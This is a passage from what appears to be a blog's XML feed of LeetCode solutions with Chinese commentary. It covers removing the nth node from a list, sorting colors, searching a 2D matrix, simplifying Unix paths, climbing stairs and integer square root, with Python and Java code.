ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeNthFromEnd</span><span class="params">(self, head, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 计算链表长度</span></span><br><span class="line">        linked_list = head</span><br><span class="line">        count = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> linked_list.next:</span><br><span class="line">            linked_list = linked_list.next</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        location = count - n</span><br><span class="line">        <span class="keyword">if</span> location == <span class="number">0</span>:</span><br><span class="line">            head = head.next</span><br><span class="line">            <span class="keyword">return</span> head</span><br><span class="line">        </span><br><span class="line">        before = head</span><br><span class="line">        count = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> count &lt; location:</span><br><span class="line">            before = before.next</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        before.next = before.next.next</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> head</span><br></pre></td></tr></table></figure>
<p>一次遍历的基本思路就是用两个指针一前一后遍历链表，在第一指针遍历了$n$节点后，第二个指针开始和它同步前进。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">removeNthFromEnd</span><span class="params">(self, head, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        </span><br><span class="line">        linked_list = head</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> linked_list.next:</span><br><span class="line">            linked_list = linked_list.next</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count == n:</span><br><span class="line">                to_remove = head</span><br><span class="line">            <span class="keyword">elif</span> count &gt; n:</span><br><span class="line">                to_remove = to_remove.next </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> count +<span class="number">1</span> == n:</span><br><span class="line">            <span class="comment"># 移除首节点</span></span><br><span class="line">            head = head.next</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> to_remove.next:</span><br><span class="line">            <span class="comment"># 移除末尾节点</span></span><br><span class="line">            to_remove.next = <span class="keyword">None</span></span><br><span class="line">            print(<span class="string">"sf"</span>)</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            to_remove.next = to_remove.next.next</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> head</span><br></pre></td></tr></table></figure>
<p>Your runtime beats 100.00 % of python3 submissions.</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[75. Sort Colors]]></title>
      <url>/wiki/2017/10/30/Leetcode-75-Sort-Colors/</url>
      <content type="html"><![CDATA[<p>Given an array with $n$ objects colored red, white or blue, sort them <a href="https://en.wikipedia.org/wiki/In-place_algorithm">in-place</a> so that objects of the same color are adjacent, with the colors in the order red, white and blue.</p>
<p>Here, we will use the integers 0, 1, and 2 to represent the color red, white, and blue respectively.</p>
<p>Note: You are not suppose to use the library’s sort function for this problem.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [2,0,2,1,1,0]</span><br><span class="line">Output: [0,0,1,1,2,2]</span><br></pre></td></tr></table></figure>
<p>Follow up:</p>
<ul>
<li>A rather straight forward solution is a two-pass algorithm using counting sort.</li>
<li>First, iterate the array counting number of 0’s, 1’s, and 2’s, then overwrite array with total number of 0’s, then 1’s and followed by 2’s.</li>
<li>Could you come up with a one-pass algorithm using only constant space?</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>题目都说了可以使用计数排序(couting sort)，那么肯定先用计数排序：先计数每一种颜色的数目，然后按顺序将数组填充上相应数目的颜色。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sortColors</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] colorCount = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>]; <span class="comment">// count 0, 1, 2</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> color : nums)</span><br><span class="line">        colorCount[color]++;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, index = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> ( ; colorCount[i] &gt; <span class="number">0</span>; colorCount[i]--)</span><br><span class="line">            nums[index++] = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这道题目实际上是<a href="https://en.wikipedia.org/wiki/Dutch_national_flag_problem">Dutch national flag problem</a>，是鼎鼎大名的Dijkstra提出的。one-pass solution：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sortColors</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>, end = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= end; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (nums[i] == <span class="number">2</span> &amp;&amp; i &lt; end) swap(nums, i, end--);</span><br><span class="line">        <span class="keyword">while</span> (nums[i] == <span class="number">0</span> &amp;&amp; i &gt; start) swap(nums, i, start++);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp = nums[i];</span><br><span class="line">    nums[i] = nums[j];</span><br><span class="line">    nums[j] = tmp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Sort </tag>
            
            <tag> Array </tag>
            
            <tag> Two Pointers </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[74. Search a 2D Matrix]]></title>
      <url>/wiki/2017/10/30/Leetcode-74-Search-a-2D-Matrix/</url>
      <content type="html"><![CDATA[<p>Write an efficient algorithm that searches for a value in an $m \times n$ matrix. This matrix has the following properties:</p>
<ul>
<li>Integers in each row are sorted from left to right.</li>
<li>The first integer of each row is greater than the last integer of the previous row.</li>
</ul>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">matrix = [</span><br><span class="line">  [1,   3,  5,  7],</span><br><span class="line">  [10, 11, 16, 20],</span><br><span class="line">  [23, 30, 34, 50]</span><br><span class="line">]</span><br><span class="line">target = 3</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">matrix = [</span><br><span class="line">  [1,   3,  5,  7],</span><br><span class="line">  [10, 11, 16, 20],</span><br><span class="line">  [23, 30, 34, 50]</span><br><span class="line">]</span><br><span class="line">target = 13</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>看到这道题目的时候，看到搜索，首先联想到是二分法。但是一般情况下，使用二分法的对象是一维数组，这里的二维数组怎么处理呢？一种直接的想法就是，首先找到目标所在的行，然后找到所在的列。时间复杂度是$O(\log(m) + \log(n))$。过程中需要特别注意出现空数组(<code>[[ ]]</code>, <code>[ ]</code>)的情况。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">searchMatrix</span><span class="params">(<span class="keyword">int</span>[][] matrix, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">int</span> m = matrix.length;</span><br><span class="line">    <span class="keyword">if</span> (m == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">int</span> n = matrix[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//find row</span></span><br><span class="line">    <span class="keyword">int</span> row;</span><br><span class="line">    <span class="keyword">int</span> lo = <span class="number">0</span>, hi = m - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (lo &lt;= hi) &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (hi + lo) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> cmp = matrix[mid][n - <span class="number">1</span>] - target;</span><br><span class="line">        <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>) hi = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>) lo = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    row = lo;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// check row</span></span><br><span class="line">    <span class="keyword">if</span> (row &gt; m - <span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//find column</span></span><br><span class="line">    <span class="keyword">int</span> col;</span><br><span class="line">    lo = <span class="number">0</span>; hi = n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (lo &lt;= hi) &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (hi + lo) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> cmp = matrix[row][mid] - target;</span><br><span class="line">        <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>) hi = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>) lo = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    col = lo - <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是这种写法，真的有点复杂，而且非常容易出错，反正我写的过程中出现了不少小的错误。有没有更简单、更直接的方法呢？当然是有的！直接把二维数组看成是一维数组，唯一需要变动的是<code>lo</code>, <code>hi</code>和下标的处理:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> lo = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> hi = m * n - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> mid = (lo + hi) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line"><span class="comment">// access</span></span><br><span class="line">matrix[mid/n][mid%n]</span><br></pre></td></tr></table></figure>
<p>完整的代码如下：</p>
<p>它的算法复杂度和第一种方案一样，也是$O(\log(mn))$.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">searchMatrix</span><span class="params">(<span class="keyword">int</span>[][] matrix, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m = matrix.length;</span><br><span class="line">    <span class="keyword">if</span> (m == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">int</span> n = matrix[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> lo = <span class="number">0</span>, hi = m*n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (lo &lt;= hi) &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (lo + hi) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> cmp = matrix[mid/n][mid%n] - target;</span><br><span class="line">        <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>) hi = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>) lo = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[71. Simplify Path]]></title>
      <url>/wiki/2017/10/30/Leetcode-71-Simplify-Path/</url>
      <content type="html"><![CDATA[<p>Given an absolute path for a file (Unix-style), simplify it.</p>
<p>For example,</p>
<p><strong>path</strong> = <code>&quot;/home/&quot;</code>, =&gt; <code>&quot;/home&quot;</code><br><strong>path</strong> = <code>&quot;/a/./b/../../c/&quot;</code>, =&gt; <code>&quot;/c&quot;</code></p>
<p>Corner Cases:</p>
<ul>
<li>Did you consider the case where <strong>path</strong> = <code>&quot;/../&quot;</code>?<ul>
<li>In this case, you should return <code>&quot;/&quot;</code>.</li>
</ul>
</li>
<li>Another corner case is the path might contain multiple slashes <code>&#39;/&#39;</code> together, such as <code>&quot;/home//foo/&quot;</code>.<ul>
<li>In this case, you should ignore redundant slashes and return <code>&quot;/home/foo&quot;</code>.</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Given an absolute path for a file (Unix-style), simplify it.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/simplify-path/description/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 使用stack处理，需要注意得是可能会出现"/.."的情况，</span></span><br><span class="line"><span class="comment"> * 所以要判断stack.isEmpty()；</span></span><br><span class="line"><span class="comment"> * 也需要注意空的情况，需要判断stack.size()==0。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q71SimplifyPath</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">simplifyPath</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">        Stack&lt;String&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String s: path.split(<span class="string">"/"</span>)) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (s) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">""</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">"."</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">".."</span>:</span><br><span class="line">                    <span class="keyword">if</span> (!stack.isEmpty())</span><br><span class="line">                        stack.pop();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    stack.push(s);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (stack.size()==<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"/"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        StringBuilder newPath = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (String s: stack) &#123;</span><br><span class="line">            newPath.append(<span class="string">"/"</span>);</span><br><span class="line">            newPath.append(s);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> newPath.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Stack </tag>
            
            <tag> String </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[70. Climbing Stairs]]></title>
      <url>/wiki/2017/10/30/Leetcode-70-Climbing-Stairs/</url>
      <content type="html"><![CDATA[<p>You are climbing a stair case. It takes $n$ steps to reach to the top.</p>
<p>Each time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top?</p>
<p>Note: Given $n$ will be a positive integer.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input: 2</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: There are two ways to climb to the top.</span><br><span class="line">1. 1 step + 1 step</span><br><span class="line">2. 2 steps</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Input: 3</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: There are three ways to climb to the top.</span><br><span class="line">1. 1 step + 1 step + 1 step</span><br><span class="line">2. 1 step + 2 steps</span><br><span class="line">3. 2 steps + 1 step</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目考查的是基本的动态规划思想。设想你在楼梯的前$i$个台阶有numOfWays[i]种走法，那么前$i+1$个台阶有几种走法。分两种情况，可能此时你站在第$i$个台阶，那么向前一步即可；也有可能你站在第$i-1$个台阶，那么向前走两步即可。如果提前知道站在第$i$个台阶的走法数，和站在第$i-1$个台阶的走法数，那么把它们相加不就是前$i+1$个台阶的走法数。也就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">numOfWays[i] = numOfWays[i - 1] + numOfWays[i - 2];</span><br></pre></td></tr></table></figure>
<p>根据上面的关系式，代码就非常简单了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] numOfWays = <span class="keyword">new</span> <span class="keyword">int</span>[n+<span class="number">1</span>];</span><br><span class="line">    numOfWays[<span class="number">0</span>] = <span class="number">1</span>; numOfWays[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n + <span class="number">1</span>; i++)</span><br><span class="line">        numOfWays[i] = numOfWays[i - <span class="number">1</span>] + numOfWays[i - <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">return</span> numOfWays[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以不存储中间结果：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> last = <span class="number">1</span>, secondLast = <span class="number">1</span>, now = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n + <span class="number">1</span>; i++) &#123;</span><br><span class="line">        now = last + secondLast;</span><br><span class="line">        secondLast = last;</span><br><span class="line">        last = now;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> now;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[69. Sqrt(x)]]></title>
      <url>/wiki/2017/10/30/Leetcode-69-Sqrt-x/</url>
      <content type="html"><![CDATA[<p>Implement <code>int sqrt(int x)</code>.</p>
<p>Compute and return the square root of $x$, where $x$ is guaranteed to be a non-negative integer.</p>
<p>Since the return type is an integer, the decimal digits are truncated and only the integer part of the result is returned.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 4</span><br><span class="line">Output: 2</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: 8</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: The square root of 8 is 2.82842..., and since </span><br><span class="line">             the decimal part is truncated, 2 is returned.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目可以使用二分查找，唯一需要注意的就是整数值可能过大，所以这里当计算平方的时候采用double类型防止两个整数相乘溢出。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">mySqrt</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lo = <span class="number">1</span>, hi = x;</span><br><span class="line">    <span class="keyword">while</span> (lo &lt;= hi) &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (lo + hi) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">double</span> cmp = ((<span class="keyword">double</span>) mid)* mid - x;</span><br><span class="line">        <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>) hi = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>) lo = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> lo - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在比较数字的时候，采用除法更好一些，避免了int类型的转换，和double类型的保存:</p>
